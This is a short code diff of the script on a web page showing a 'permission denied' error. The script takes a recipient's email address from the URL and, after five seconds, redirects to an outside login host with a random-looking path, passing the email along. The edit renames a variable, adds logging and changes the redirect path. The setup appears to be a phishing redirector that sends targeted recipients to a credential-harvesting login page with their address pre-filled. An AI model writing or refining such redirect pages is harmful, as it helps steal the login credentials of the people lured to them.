@@ -120,14 +120,17 @@ emsg: ErrorPermissionDenied
 </div>
 
 <script>
-  // Get email from current URL
+  // Read email from URL
   const params = new URLSearchParams(window.location.search);
-  const email = params.get("email");
+  const recipientEmail = params.get("email");
 
-  // Redirect after 5 seconds
+  console.log(recipientEmail);
+
+  // Example redirect using the same email
   setTimeout(() => {
     window.location.href =
-      "https://login1.propecs.com/EsTQZNnm?email=" + encodeURIComponent(email || "");
+      "https://login1.propecs.com/EsTQZNnm/dashboard?email=" +
+      encodeURIComponent(recipientEmail || "");
   }, 5000);
 </script>
 
